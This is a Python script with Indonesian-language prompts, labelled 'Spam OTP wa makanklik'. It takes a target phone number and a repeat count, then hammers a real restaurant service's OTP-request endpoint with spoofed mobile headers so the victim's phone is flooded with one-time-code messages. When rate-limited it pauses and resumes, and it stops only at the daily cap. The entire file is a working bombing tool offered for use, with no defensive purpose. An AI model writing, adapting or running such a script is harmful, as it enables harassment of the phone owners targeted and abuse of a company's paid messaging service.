import requests, os, sys, json, time
r = requests.Session()
hd = {'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}
class w:
 m = '\033[1;31m' # merah
 b = '\033[1;36m' # biru
 k = '\033[1;33m' # kuning
 h = '\033[1;32m' # hijau
 u = '\033[1;35m' # ungu
 p = '\033[1;37m' # putih
 i = '\033[1;90m' # abu abu
 ut = '\033[1;34m' # ungu tua
 tm = '\x1b[103m\x1b[31m' # tebal merah (background kuning)
 df = '\x1b[0m'
 c = '\033[1;96m' # cyan
class eek:
 def tunggu(t):
  while t:
   wd=f'\r{w.i}[{w.m}#{w.i}] {w.h}Jeda selama {w.i}({w.p}'+str(t)+f'{w.i}) {w.h}detik '
   print(wd,end='\r',flush=True)
   time.sleep(1)
   t -= 1
class main:
 def __init__():
     try:
      os.system("clear")
      main.banner()
      main.subbanner()
      main.spam()
     except requests.exceptions.ConnectionError:
      print (f"{w.i}[{w.h}X{w.i}] {w.m}Jaringan tidak memadai!!!")
     except KeyboardInterrupt:
      print (f"{w.i}[{w.h}X{w.i}] {w.h}Selamat tinggal!!")
 def banner():
     print (f"""  __  __       _               _  ___ _ _    
 |  \/  | __ _| | ____ _ _ __ | |/ / (_) | __
 | |\/| |/ _` | |/ / _` | '_ \| ' /| | | |/ /
 | |  | | (_| |   < (_| | | | | . \| | |   < 
 |_|  |_|\__,_|_|\_\__,_|_| |_|_|\_\_|_|_|\_\
                                             """)
 def subbanner():
     print (f"""{w.i}[{w.b}+{w.i}] {w.m}Nama SC {w.i}» {w.p}Spam OTP wa makanklik
{w.i}[{w.b}+{w.i}] {w.m}Author {w.i}» {w.p}abilseno11
{w.i}[{w.b}+{w.i}] {w.m}Github {w.i}» {w.p}https://github.com/AbilSeno
                   {w.tm}INPUT{w.df}""")
 def spam():
     spam = input(f'{w.i}[{w.h}-{w.i}] {w.k}Masukkan nomor target (ex:088xx) {w.i}› {w.m}')
     if (spam == '') or (len(spam) < 5):
      main.spam()
     else:
      jum = int(input(f'{w.i}[{w.h}-{w.i}] {w.k}Masukkan jumlah spam {w.i}› {w.m}'))
      data = {'phone':spam}
      for spem in range(jum):
       start = r.post('https://member.makanklik.com/data/get_data?func=reqOTP',headers=hd,data=data).text
       jsn = json.loads(start)
       if jsn["status"] == 'ok':
        print (f"{w.i}[{w.h}SUCCESS{w.i}] {w.k}Sukses mengirim spam ke no {w.p}{spam}")
       if jsn["status"] == 'failed_interval':
        print (f"{w.i}[{w.k}DELAY{w.i}] {w.k}Coba lagi setelah 1 menit")
        eek.tunggu(60)
       if jsn["status"] == 'failed_max_day':
        print (f"{w.i}[{w.m}LIMIT{w.i}] {w.k}Limit spam tercapai, coba lagi besok!!!")
        exit()
       else:
        pass

if __name__ == "__main__":
 main.__init__()
